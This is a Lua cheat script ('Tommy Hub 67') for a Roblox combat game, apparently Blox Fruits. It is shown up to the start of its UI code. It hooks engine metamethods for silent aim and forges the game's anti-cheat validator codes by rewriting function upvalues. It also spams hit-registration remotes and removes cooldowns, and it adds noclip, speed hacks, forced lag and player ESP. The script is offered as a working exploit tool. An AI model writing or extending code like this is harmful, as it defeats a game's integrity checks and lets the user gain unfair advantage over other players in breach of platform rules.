--==============================================================
-- TOMMY HUB 67  |  Combat · Glitches · Soru · ESP · Aimbot 67
-- TikTok: @accountxz
--==============================================================
local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local UIS          = game:GetService("UserInputService")
local RS           = game:GetService("ReplicatedStorage")
local player       = Players.LocalPlayer
local camera       = workspace.CurrentCamera
local mouse        = player:GetMouse()
local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)

local env = (getgenv and getgenv()) or _G
if env.TommyHub67 then pcall(env.TommyHub67) end

local conns, alive = {}, true
local function track(c) table.insert(conns, c) return c end

--==================== ESTADO ====================
local S = {
    SkillAimbot=false, DragonM1=false, TargetPlayers=true, TargetMobs=false,
    TeamCheck=false, PvPCheck=true, SafeZoneCheck=true, MaxDist=2500, Rainbow=false,
    A67_Enabled=false, A67_Prediction=0.15, A67_MaxDist=1500,
    A67_TargetNPC=true, A67_TargetPlayer=false, A67_ShowMarker=true,
    FastAttack=false, AntiStun=false, WalkSpeed=false, Speed=50,
    Dash=false, DashLen=50, Noclip=false, WaterWalk=false, AutoV4=false,
    SangNoCD=false, SangAuto=false, SangDrop=2, NoAnim=false, JumpPower=500,
    SoulGuitar=false, SoulDash=121, AntiLava=false, DelShip=false, SuperJump=false,
    InfSoru=false, SoruAimbot=false, SoruTarget="Nearest", SoruDist=1000,
    PortalSoru=false, PortalSoruDelay=0.35,
    PortalSangC=false, PortalSangCDelay=0.35, PortalSangCTrigger="PortalF",
    FlashCombo=false, FlashWeapon="Fruit", FlashKey="Z", FlashDelay=0.3,
    ESP=false, ESPName=true, ESPLevel=true, ESPBounty=true, ESPFruit=true,
    ESPDist=true, ESPHP=true, ESPHighlight=false, ESPSize=12,
    AutoDungeon=false, DungeonWeapon="Sword", DungeonHeight=40, DungeonV4=false,
    Theme="Purple",
}
local DEFAULTS = {}
for k, v in pairs(S) do DEFAULTS[k] = v end
local Blacklist = {}

--==================== HELPERS ====================
local function getHRP() local c = player.Character return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum() local c = player.Character return c and c:FindFirstChildOfClass("Humanoid") end
local function pressKey(kc, hold)
    if not VIM or not kc then return end
    VIM:SendKeyEvent(true, kc, false, game); task.wait(hold or 0.05); VIM:SendKeyEvent(false, kc, false, game)
end
local SLOT_KEYS = {Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four}
local ATTACK_KW = {"attack","slash","punch","m1","combo","hit","tool","ability","skill","bullet","gun","sword","melee","fruit"}
local function isAttackAnim(track)
    local n = string.lower(track.Name)
    for _, kw in ipairs(ATTACK_KW) do if string.find(n, kw) then return true end end
    return track.Priority == Enum.AnimationPriority.Action
end
local function stopNonAttackAnims()
    local h = getHum(); local a = h and h:FindFirstChildOfClass("Animator")
    if not a then return end
    for _, t in pairs(a:GetPlayingAnimationTracks()) do
        if not isAttackAnim(t) then t:Stop(0) end
    end
end

--==================== TARGETING ====================
local function pvpOn(p) return p:GetAttribute("PvpDisabled") ~= true end
local function inSafeZone(p)
    local ok, res = pcall(function()
        local c = p.Character; local r = c and c:FindFirstChild("HumanoidRootPart")
        local wo = workspace:FindFirstChild("_WorldOrigin")
        if not (r and wo) then return false end
        local sz = wo:FindFirstChild("SafeZones")
        if sz then
            for _, z in pairs(sz:GetChildren()) do
                local m = z:FindFirstChild("Mesh")
                if m and m:IsA("SpecialMesh") then
                    if (z.Position - r.Position).Magnitude <= (z.Size.X * m.Scale.X) / 2 then return true end
                end
            end
        end
        return false
    end)
    return ok and res
end
local function isEnemy(p)
    if p == player then return false end
    if S.TeamCheck and p.Team and player.Team and p.Team.Name == "Marines" and player.Team.Name == "Marines" then return false end
    return true
end

local function closestPlayerChar(maxDist)
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, maxDist or math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and not Blacklist[p.Name] and pvpOn(p) and p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = p.Character end
            end
        end
    end
    return best
end
local function closestNPC()
    local me = getHRP(); if not me then return nil end
    local en = workspace:FindFirstChild("Enemies") or workspace
    local best, bd = nil, S.MaxDist
    for _, n in pairs(en:GetChildren()) do
        if n:IsA("Model") and not Players:GetPlayerFromCharacter(n) then
            local r = n:FindFirstChild("HumanoidRootPart")
            local h = n:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = n end
            end
        end
    end
    return best
end

local currentTarget = nil
local function getAimbotTarget()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.MaxDist
    local function check(c)
        if not c or c == player.Character then return end
        local p = Players:GetPlayerFromCharacter(c)
        if p then
            if Blacklist[p.Name] or not isEnemy(p) then return end
            if S.PvPCheck and not pvpOn(p) then return end
            if S.SafeZoneCheck and inSafeZone(p) then return end
        end
        local h = c:FindFirstChildOfClass("Humanoid")
        local part = c:FindFirstChild("HumanoidRootPart")
        if h and h.Health > 0 and part then
            local d = (part.Position - me.Position).Magnitude
            if d < bd then bd = d; best = part end
        end
    end
    if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then check(p.Character) end end end
    if S.TargetMobs then
        local en = workspace:FindFirstChild("Enemies")
        if en then for _, e in ipairs(en:GetChildren()) do check(e) end end
    end
    return best
end

local function soruTargetPart()
    local name = S.SoruTarget
    local c
    if name == "Nearest" then c = closestPlayerChar(S.SoruDist)
    else local p = Players:FindFirstChild(name); c = p and p.Character end
    return c and c:FindFirstChild("HumanoidRootPart")
end

--==================== SILENT AIM (HOOKS) ====================
if hookmetamethod and newcclosure and checkcaller and getnamecallmethod then
    pcall(function()
        local oldNC
        oldNC = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if alive and S.SkillAimbot and currentTarget and not checkcaller() then
                local m = getnamecallmethod()
                if m == "FireServer" or m == "InvokeServer" then
                    local args = table.pack(...)
                    local changed = false
                    for i = 1, args.n do
                        local a = args[i]
                        if typeof(a) == "Vector3" then args[i] = currentTarget.Position; changed = true
                        elseif typeof(a) == "CFrame" then args[i] = CFrame.new(currentTarget.Position); changed = true end
                    end
                    if changed then return oldNC(self, table.unpack(args, 1, args.n)) end
                end
            end
            return oldNC(self, ...)
        end))
        local oldIdx
        oldIdx = hookmetamethod(game, "__index", newcclosure(function(self, k)
            if alive and self == mouse and (k == "Hit" or k == "Target") and not checkcaller() then
                if S.SoruAimbot then
                    local t = soruTargetPart()
                    local me = getHRP()
                    if t and me and (t.Position - me.Position).Magnitude <= S.SoruDist then
                        if k == "Hit" then return CFrame.new(t.Position) end
                        return t
                    end
                end
                if S.SkillAimbot and currentTarget then
                    if k == "Hit" then return CFrame.new(currentTarget.Position) end
                    return currentTarget
                end
            end
            return oldIdx(self, k)
        end))
    end)
end

local rainbowHL
track(RunService.RenderStepped:Connect(function()
    if S.SkillAimbot or S.Rainbow then currentTarget = getAimbotTarget() else currentTarget = nil end
    if S.Rainbow and currentTarget and currentTarget.Parent then
        local c = currentTarget.Parent
        if not rainbowHL or rainbowHL.Parent ~= c then
            if rainbowHL then rainbowHL:Destroy() end
            rainbowHL = Instance.new("Highlight")
            rainbowHL.Name = "TommyTargetHL"; rainbowHL.Adornee = c
            rainbowHL.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            rainbowHL.FillTransparency = 0.2; rainbowHL.Parent = c
        end
        local hue = (tick() * 0.7) % 1
        rainbowHL.FillColor = Color3.fromHSV(hue, 1, 1)
        rainbowHL.OutlineColor = Color3.fromHSV((hue + 0.25) % 1, 1, 1)
    elseif rainbowHL then rainbowHL:Destroy(); rainbowHL = nil end
end))

--==================== AIMBOT 67 DESCARADO ====================
local A67_marker = nil

local function A67_createMarker()
    if A67_marker and A67_marker.Parent then return A67_marker end
    local m = Instance.new("Part")
    m.Name = "TommyA67_Marker"; m.Shape = Enum.PartType.Ball
    m.Size = Vector3.new(1, 1, 1); m.Material = Enum.Material.Neon
    m.Color = Color3.fromRGB(255, 60, 60); m.Anchored = true
    m.CanCollide = false; m.CanQuery = false; m.CanTouch = false
    m.Transparency = 1; m.Parent = workspace
    A67_marker = m
    return m
end

local function A67_findNPC()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.A67_MaxDist
    local en = workspace:FindFirstChild("Enemies")
    if en then
        for _, m in ipairs(en:GetChildren()) do
            if m:IsA("Model") and m ~= player.Character then
                local h = m:FindFirstChildOfClass("Humanoid")
                local r = m:FindFirstChild("HumanoidRootPart")
                if h and r and h.Health > 0 then
                    local d = (r.Position - me.Position).Magnitude
                    if d < bd then bd = d; best = m end
                end
            end
        end
    end
    return best
end

local function A67_findPlayer()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.A67_MaxDist
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = p.Character end
            end
        end
    end
    return best
end

track(RunService.RenderStepped:Connect(function()
    if not S.A67_Enabled then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local targetChar = nil
    if S.A67_TargetNPC then targetChar = A67_findNPC() end
    if not targetChar and S.A67_TargetPlayer then targetChar = A67_findPlayer() end
    if not targetChar then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local root = targetChar:FindFirstChild("HumanoidRootPart")
    local hum = targetChar:FindFirstChildOfClass("Humanoid")
    if not root or not hum or hum.Health <= 0 then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local targetPos = root.Position
    if hum.WalkSpeed >= 5 then targetPos = root.Position + root.Velocity * S.A67_Prediction end
    camera.CFrame = camera.CFrame:Lerp(CFrame.lookAt(camera.CFrame.Position, targetPos), 0.4)
    if S.A67_ShowMarker then
        local m = A67_createMarker()
        m.Position = targetPos
        m.Transparency = 0.4
    elseif A67_marker and A67_marker.Parent then
        A67_marker.Transparency = 1
    end
end))

--==================== DRAGON GUN ====================
local ShootEvent, Validator2, ShootFunction
local V = {v26=12, v22=13, v25=14, v21=15, v23=16, v24=17, v27=18}
local getupval  = debug and (debug.getupvalue or getupvalue) or getupvalue
local setupval  = debug and (debug.setupvalue or setupvalue) or setupvalue
local getupvals = debug and (debug.getupvalues or getupvalues) or getupvalues

task.spawn(function()
    pcall(function()
        local net = RS:WaitForChild("Modules", 3):WaitForChild("Net", 3)
        ShootEvent = net:WaitForChild("RE/ShootGunEvent", 3)
        Validator2 = RS:WaitForChild("Remotes", 3):WaitForChild("Validator2", 3)
    end)
end)

local function nextValidator()
    if not ShootFunction then
        local ok, res = pcall(require, RS:WaitForChild("Controllers"):WaitForChild("CombatController"))
        if ok and type(res) == "table" and res.Attack then ShootFunction = getupval(res.Attack, 9) end
    end
    if not (ShootFunction and getupvals) then return 0, 0 end
    local up = getupvals(ShootFunction); if not up then return 0, 0 end
    if up[V.v21] ~= 727595 then
        for i, v in pairs(up) do
            if v == 727595 then
                local o = i - 15
                V.v21=i; V.v22=13+o; V.v23=16+o; V.v24=17+o; V.v26=12+o; V.v25=14+o; V.v27=18+o
                break
            end
        end
    end
    local v1,v2,v3,v4 = getupval(ShootFunction,V.v21), getupval(ShootFunction,V.v22), getupval(ShootFunction,V.v23), getupval(ShootFunction,V.v24)
    local v5,v6,v7 = getupval(ShootFunction,V.v25), getupval(ShootFunction,V.v26), getupval(ShootFunction,V.v27)
    if not (v1 and v2 and v3 and v4 and v5 and v6 and v7) then return 0, 0 end
    local v8 = v6 * v2
    local v9 = (v5 * v2 + v6 * v1) % v3
    v9 = (v9 * v3 + v8) % v4
    v5 = math.floor(v9 / v3); v6 = v9 - v5 * v3; v7 = v7 + 1
    setupval(ShootFunction, V.v25, v5); setupval(ShootFunction, V.v26, v6); setupval(ShootFunction, V.v27, v7)
    return math.floor(v9 / v4 * 16777215), v7
end

task.spawn(function()
    while alive do
        task.wait(0.085)
        if S.DragonM1 then pcall(function()
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if not tool or tool.ToolTip ~= "Gun" then return end
            local best, bd = nil, math.huge
            local me = getHRP(); if not me then return end
            local function consider(c)
                local r = c and c:FindFirstChild("HumanoidRootPart"); local h = c and c:FindFirstChildOfClass("Humanoid")
                if r and h and h.Health > 0 then
                    local d = (r.Position - me.Position).Magnitude
                    if d < bd then bd = d; best = r end
                end
            end
            if S.TargetMobs then local en = workspace:FindFirstChild("Enemies"); if en then for _, e in ipairs(en:GetChildren()) do consider(e) end end end
            if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then consider(p.Character) end end end
            if not best or not ShootEvent then return end
            local code, count = nextValidator()
            if code ~= 0 and Validator2 then Validator2:FireServer(code, count) end
            tool:SetAttribute("LocalOverheat", 0)
            tool:SetAttribute("LocalTotalShots", (tool:GetAttribute("LocalTotalShots") or 0) + 1)
            ShootEvent:FireServer(best.Position, {best})
        end) end
    end
end)

--==================== FAST ATTACK ====================
local RegisterHit, RegisterAttack
task.spawn(function()
    for _, v in pairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if v.Name == "RE/RegisterHit" then RegisterHit = v end
            if v.Name == "RE/RegisterAttack" then RegisterAttack = v end
        end
    end
end)
local fastRunning = false
local function startFastAttack()
    if fastRunning then return end
    fastRunning = true
    task.spawn(function()
        while alive and S.FastAttack do
            RunService.Stepped:Wait()
            local me = getHRP()
            if me and RegisterHit and RegisterAttack then
                local list = {}
                local function add(c)
                    local h = c and c:FindFirstChildOfClass("Humanoid"); local r = c and c:FindFirstChild("HumanoidRootPart"); local hd = c and c:FindFirstChild("Head")
                    if h and r and hd and h.Health > 0 and (r.Position - me.Position).Magnitude <= 2500 then table.insert(list, {c, hd}) end
                end
                for _, p in ipairs(Players:GetPlayers()) do if p ~= player and not Blacklist[p.Name] then add(p.Character) end end
                local en = workspace:FindFirstChild("Enemies")
                if en then for _, n in ipairs(en:GetChildren()) do add(n) end end
                if #list > 0 then
                    pcall(function() RegisterAttack:FireServer(0); RegisterHit:FireServer(list[1][2], list) end)
                end
            end
        end
        fastRunning = false
    end)
end

--==================== ANTI STUN ====================
local asConns = {}
local function setAntiStun(on)
    S.AntiStun = on
    for _, c in pairs(asConns) do c:Disconnect() end
    asConns = {}
    if on then
        table.insert(asConns, RunService.Heartbeat:Connect(function()
            pcall(function()
                local c = player.Character; if not c then return end
                c:SetAttribute("AllCooldown", 0); c:SetAttribute("FlashstepCooldown", 1)
                c:SetAttribute("UsingSkill", false); c:SetAttribute("isUsingSkill", false); c:SetAttribute("Busy", false)
                local h, r = c:FindFirstChildOfClass("Humanoid"), c:FindFirstChild("HumanoidRootPart")
                if h and h.WalkSpeed < 16 then h.WalkSpeed = 16 end
                if r then for _, v in ipairs(r:GetChildren()) do if v:IsA("BodyVelocity") or v:IsA("BodyPosition") then v:Destroy() end end end
            end)
        end))
    end
end

--==================== MOVIMIENTO ====================
track(RunService.Heartbeat:Connect(function(dt)
    if not S.WalkSpeed then return end
    local c = player.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local r = c and c:FindFirstChild("HumanoidRootPart")
    if not (h and r) or h.Health <= 0 or h.Sit then return end
    local dir = h.MoveDirection
    local extra = S.Speed - h.WalkSpeed
    if dir.Magnitude > 0 and extra > 0 then r.CFrame = r.CFrame + dir * extra * dt end
end))

track(RunService.Stepped:Connect(function()
    local c = player.Character; if not c then return end
    if S.Noclip then
        for _, p in pairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
    end
end))

local function applyDash(len)
    pcall(function()
        local c = player.Character
        if c then c:SetAttribute("DashLength", len); c:SetAttribute("DashLengthAir", len) end
    end)
end

task.spawn(function()
    local wp
    while alive do
        task.wait(0.15)
        if S.WaterWalk then
            if not (wp and wp.Parent) then
                wp = Instance.new("Part"); wp.Size = Vector3.new(200,1,200); wp.Transparency = 1
                wp.Anchored = true; wp.CanCollide = false; wp.Name = "TommyWater"; wp.Parent = workspace
            end
            local r = getHRP()
            if r and r.Position.Y >= 9.5 then wp.Position = Vector3.new(r.Position.X, 9.2, r.Position.Z); wp.CanCollide = true
            else wp.CanCollide = false end
        elseif wp then wp:Destroy(); wp = nil end
    end
end)

task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.AutoV4 then pcall(function()
            local c = player.Character
            local e = c and c:GetAttribute("RaceEnergy")
            if e and e >= 100 then
                local awk = player.Backpack:FindFirstChild("Awakening") or c:FindFirstChild("Awakening")
                if awk and awk:FindFirstChild("RemoteFunction") then awk.RemoteFunction:InvokeServer(true)
                else
                    local rem = RS:FindFirstChild("Remotes")
                    if rem and rem:FindFirstChild("CommF_") then rem.CommF_:InvokeServer("Awakening", true) end
                end
            end
        end) end
    end
end)

--==================== SANGUINE ====================
local lagBusy = false
local function lagFor(dur)
    if lagBusy then return end
    lagBusy = true
    local stop, interval = tick() + dur, 1 / 20
    local con
    con = RunService.RenderStepped:Connect(function()
        if tick() > stop then con:Disconnect(); lagBusy = false; return end
        local t0 = tick()
        while tick() - t0 < interval do end
    end)
end
local function pushForward(speed, life)
    local r = getHRP(); if not r then return end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = camera.CFrame.LookVector * speed; lv.Attachment0 = att; lv.Parent = r
    task.delay(life, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
end
local function sangManual() lagFor(0.43); pushForward(400, 0.9) end

local sangConn, sangCD = nil, false
local function startSangAuto()
    if sangConn then sangConn:Disconnect(); sangConn = nil end
    local h = getHum(); if not h then return end
    sangConn = h.AnimationPlayed:Connect(function(t)
        if not S.SangAuto or sangCD then return end
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if not tool or not (string.find(string.lower(tool.Name), "sanguine") or string.find(string.lower(tool.Name), "art")) then return end
        local id = tostring(t.Animation and t.Animation.AnimationId or "")
        if id:find("14586872029") or id:find("14418367908") or id:find("14418370048") then
            sangCD = true
            lagFor(S.SangDrop); pushForward(400, 0.9)
            task.delay(S.SangDrop + 0.5, function() sangCD = false end)
        end
    end)
end
track(player.CharacterAdded:Connect(function() task.wait(0.5); if S.SangAuto then startSangAuto() end end))

--==================== NO ANIMS / SUPER JUMP ====================
track(RunService.Stepped:Connect(function()
    if not S.NoAnim then return end
    local h = getHum(); if h then h.AutoRotate = true end
    stopNonAttackAnims()
end))

local function superJump()
    local r, h = getHRP(), getHum()
    if not r or not h or h.Health <= 0 then return end
    stopNonAttackAnims()
    r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, S.JumpPower, r.AssemblyLinearVelocity.Z)
    h:ChangeState(Enum.HumanoidStateType.Jumping)
end
local lastJump = 0
track(UIS.JumpRequest:Connect(function()
    if S.SuperJump and tick() - lastJump > 0.35 then
        lastJump = tick(); superJump()
    end
end))

--==================== SOUL GUITAR ====================
local guitarBusy = false
local function soulGuitarJump()
    if guitarBusy then return end
    local c = player.Character; local r, h = getHRP(), getHum()
    if not (c and r and h) then return end
    local tool = c:FindFirstChild("Skull Guitar") or player.Backpack:FindFirstChild("Skull Guitar")
    if not tool then return end
    guitarBusy = true
    if tool.Parent == player.Backpack then h:EquipTool(tool); task.wait(0.15) end
    pcall(function()
        local eq = tool:FindFirstChild("EquipEvent"); if eq then eq:FireServer(true) end
        local rem = RS:FindFirstChild("Remotes")
        local val = rem and rem:FindFirstChild("Validator2"); if val then val:FireServer(15627583, 1) end
        local re = tool:FindFirstChild("RemoteEvent"); if re then re:FireServer("TAP", mouse.Hit.Position) end
    end)
    stopNonAttackAnims()
    local look = r.CFrame.LookVector
    local flat = Vector3.new(look.X, 0, look.Z)
    if flat.Magnitude > 0 then flat = flat.Unit end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = Vector3.new(flat.X * 180, 80, flat.Z * 180); lv.Attachment0 = att; lv.Parent = r
    h:ChangeState(Enum.HumanoidStateType.Jumping)
    task.delay(0.7, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
    task.wait(0.6); guitarBusy = false
end
track(UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.UserInputType == Enum.UserInputType.MouseButton1 and S.SoulGuitar then soulGuitarJump() end
end))

--==================== ANTI LAVA / DEL SHIP ====================
track(RunService.Stepped:Connect(function()
    if not S.AntiLava then return end
    local c = player.Character; if not c then return end
    for _, p in pairs(c:GetDescendants()) do
        if p:IsA("BasePart") and not ({HumanoidRootPart=1, Torso=1, UpperTorso=1, LowerTorso=1, Head=1})[p.Name] then p.CanTouch = false end
    end
end))

task.spawn(function()
    local ships = {"CursedShip", "Cursed Ship", "Ship"}
    local ext = {"Wall","Floor","Ceiling","Base","Hull","Window","DoorFrame"}
    while alive do
        task.wait(3)
        if S.DelShip then pcall(function()
            for _, o in pairs(workspace:GetDescendants()) do
                for _, sn in pairs(ships) do
                    if o.Name:find(sn) and (o:IsA("Model") or o:IsA("Folder")) then
                        for _, ch in pairs(o:GetDescendants()) do
                            if ch:IsA("BasePart") and not ch.Parent:FindFirstChild("Humanoid") then
                                local keep = false
                                for _, e in pairs(ext) do if ch.Name:find(e) then keep = true break end end
                                if not keep then ch:Destroy() end
                            end
                        end
                    end
                end
            end
        end) end
    end
end)

--==================== SORU ====================
local function attachInfSoru(c)
    if not c then return end
    if S.InfSoru then c:SetAttribute("FlashstepCooldown", 1) end
    track(c.AttributeChanged:Connect(function(a)
        if a == "FlashstepCooldown" and S.InfSoru and c:GetAttribute(a) ~= 1 then c:SetAttribute(a, 1) end
    end))
end
track(player.CharacterAdded:Connect(attachInfSoru))
if player.Character then attachInfSoru(player.Character) end
task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.InfSoru and player.Character then pcall(function() player.Character:SetAttribute("FlashstepCooldown", 1) end) end
    end
end)

local FLASH_NAMES = {"flashstepregular","flashstepdraco","flashstep","soru"}
local FLASH_IDS = {"17555632156","18461649274","616006778","616010882","5403485593","5403491911"}
local function isFlashstep(t)
    local n = string.lower(t.Name)
    for _, f in ipairs(FLASH_NAMES) do if string.find(n, f) then return true end end
    local id = t.Animation and t.Animation.AnimationId:match("%d+") or ""
    for _, f in ipairs(FLASH_IDS) do if id == f then return true end end
    return false
end
local function holdingPortal()
    local t = player.Character and player.Character:FindFirstChildOfClass("Tool")
    if not t then return false end
    local n = string.lower(t.Name)
    return string.find(n, "portal") or string.find(n, "door")
end
local function equipByName(...)
    local h = getHum(); if not h then return end
    local bp = player:FindFirstChild("Backpack"); if not bp then return end
    for _, t in ipairs(bp:GetChildren()) do
        local n = string.lower(t.Name)
        for _, kw in ipairs({...}) do
            if string.find(n, kw) then h:EquipTool(t); task.wait(0.1); return t end
        end
    end
end
local function portalCombo()
    if not holdingPortal() then equipByName("portal", "door"); task.wait(0.08) end
    if not holdingPortal() then return end
    task.wait(S.PortalSoruDelay)
    pressKey(Enum.KeyCode.X); task.wait(0.15); pressKey(Enum.KeyCode.Z)
end
local function portalSangC()
    task.wait(S.PortalSangCDelay)
    equipByName("sanguine"); task.wait(0.1)
    pressKey(Enum.KeyCode.C, 0.15)
end
local function flashCombo()
    task.wait(S.FlashDelay)
    if not S.FlashCombo then return end
    local slot = ({Melee=1, Fruit=2, Sword=3, Gun=4})[S.FlashWeapon] or 2
    pressKey(SLOT_KEYS[slot], 0.06); task.wait(0.12)
    local kc = Enum.KeyCode[S.FlashKey]; if kc then pressKey(kc, 0.06) end
end
local function monitorChar(c)
    local h = c:WaitForChild("Humanoid", 5); if not h then return end
    track(h.AnimationPlayed:Connect(function(t)
        local n = string.lower(t.Name)
        local isPortalF = n:find("portal") or n:find("teleport") or n:find("warp") or n:find("door") or n:find("world")
        local isSoru = isFlashstep(t)
        if S.PortalSoru and isSoru then task.spawn(portalCombo) end
        if S.PortalSangC and ((S.PortalSangCTrigger == "PortalF" and isPortalF) or (S.PortalSangCTrigger == "Soru" and isSoru)) then
            task.spawn(portalSangC)
        end
        if S.FlashCombo and isSoru then task.spawn(flashCombo) end
    end))
end
track(player.CharacterAdded:Connect(monitorChar))
if player.Character then monitorChar(player.Character) end

--==================== ESP ====================
local esp, cache = {}, {}
local function clearESP(p)
    local d = esp[p]
    if d then pcall(function() d.gui:Destroy() if d.hl then d.hl:Destroy() end end) esp[p] = nil end
end
local function pdata(p)
    local d = cache[p]
    if not d then d = {level="?", fruit="None", bounty=0, t=0}; cache[p] = d end
    if tick() - d.t > 5 then
        pcall(function() d.level = p.Data.Level.Value end)
        pcall(function() d.fruit = p.Data.DevilFruit.Value end)
        pcall(function() d.bounty = p.leaderstats["Bounty/Honor"].Value end)
        d.t = tick()
    end
    return d
end
local function updateESP()
    local me = getHRP()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            local c = p.Character
            local head = c and c:FindFirstChild("Head")
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = c and c:FindFirstChild("HumanoidRootPart")
            if S.ESP and head and h and r and me then
                local d = esp[p]
                if not d or d.char ~= c or not d.gui.Parent then
                    clearESP(p)
                    local bb = Instance.new("BillboardGui")
                    bb.Adornee = head; bb.Size = UDim2.new(0,200,0,75); bb.StudsOffset = Vector3.new(0,3,0); bb.AlwaysOnTop = true; bb.Parent = head
                    local t = Instance.new("TextLabel", bb)
                    t.Size = UDim2.new(1,0,1,0); t.BackgroundTransparency = 1; t.RichText = true
                    t.Font = Enum.Font.SourceSansBold; t.TextStrokeTransparency = 0
                    d = {gui=bb, label=t, char=c}; esp[p] = d
                end
                local pd = pdata(p)
                local marine = p.Team and p.Team.Name == "Marines"
                d.label.TextColor3 = marine and Color3.fromRGB(0,170,255) or Color3.fromRGB(255,70,70)
                d.label.TextSize = S.ESPSize
                local parts = {}
                if S.ESPName then parts[#parts+1] = "[" .. (marine and "Marines" or "Pirates") .. "] <font color=\"rgb(255,255,0)\">" .. p.Name .. "</font>" end
                if S.ESPLevel then parts[#parts+1] = " [Lv." .. tostring(pd.level) .. "]" end
                if S.ESPBounty then
                    local off = p:GetAttribute("PvpDisabled") == true
                    local bm = type(pd.bounty) == "number" and math.floor(pd.bounty / 1000000) or 0
                    parts[#parts+1] = "\n" .. (off and "🟢 PvP OFF" or "🔴 PvP ON") .. " | Bounty: " .. bm .. "M\n"
                end
                if S.ESPFruit then parts[#parts+1] = "Fruit: " .. tostring(pd.fruit) .. "\n" end
                if S.ESPDist then parts[#parts+1] = math.floor((r.Position - me.Position).Magnitude) .. "m | " end
                if S.ESPHP then parts[#parts+1] = "HP " .. math.floor(h.Health / math.max(h.MaxHealth, 1) * 100) .. "%" end
                d.label.Text = table.concat(parts)
                if S.ESPHighlight then
                    if not d.hl or not d.hl.Parent then
                        local hl = Instance.new("Highlight")
                        hl.Name = "TommyESP"; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        hl.FillColor = Color3.fromRGB(255,0,0); hl.OutlineColor = Color3.fromRGB(255,0,0)
                        hl.FillTransparency = 0.5; hl.Parent = c; d.hl = hl
                    end
                elseif d.hl then d.hl:Destroy(); d.hl = nil end
            else clearESP(p) end
        end
    end
end
task.spawn(function()
    while alive do pcall(updateESP); task.wait(0.15) end
end)
track(Players.PlayerRemoving:Connect(function(p) clearESP(p); cache[p] = nil end))

--==================== DUNGEONS ====================
local dgJustDied, dgLast, dgGen = false, nil, 0
track(player.CharacterAdded:Connect(function() dgJustDied = true end))

local function dgMatch(tool)
    return tool.ToolTip == S.DungeonWeapon or string.find(string.lower(tool.Name), string.lower(S.DungeonWeapon)) ~= nil
end
local function dgEquip()
    local c, h = player.Character, getHum()
    if not (c and h) then return end
    local cur = c:FindFirstChildOfClass("Tool")
    if cur and dgMatch(cur) then return end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and dgMatch(t) then h:EquipTool(t) return end
        end
    end
end
local function dgRun(gen)
    while alive and S.AutoDungeon and gen == dgGen do
        task.wait(1)
        pcall(dgEquip)
    end
end
local function dgSet(on)
    dgGen = dgGen + 1
    dgLast = nil; dgJustDied = false
    if not on then return end
    task.spawn(dgRun, dgGen)
end

--==============================================================
-- UI (VIEJA - PLANA Y FUNCIONAL)
--==============================================================
local TweenService = game:GetService("TweenService")

local THEMES = {
    Purple = Color3.fromRGB(150, 70, 255),
    Blue   = Color3.fromRGB(60, 140, 255),
    Red    = Color3.fromRGB(255, 70, 90),
    Green  = Color3.fromRGB(50, 220, 130),
    Pink   = Color3.fromRGB(255, 90, 190),
    Gold   = Color3.fromRGB(255, 190, 40),
    Cyan   = Color3.fromRGB(40, 220, 230),
}
local THEME_LIST = {"Purple", "Blue", "Red", "Green", "Pink", "Gold", "Cyan"}
local ACCENT = THEMES.Purple
local WHITE  = Color3.fromRGB(255, 255, 255)
local BG0    = Color3.fromRGB(11, 11, 17)
local BG1    = Color3.fromRGB(19, 19, 29)
local BG2    = Color3.fromRGB(28, 28, 42)
local OFFC   = Color3.fromRGB(48, 48, 68)
local MUTED  = Color3.fromRGB(150, 150, 172)
local FONT_B = Enum.Font.GothamBold
local FONT_K = Enum.Font.GothamBlack
local FONT_M = Enum.Font.GothamMedium

local themed = {}
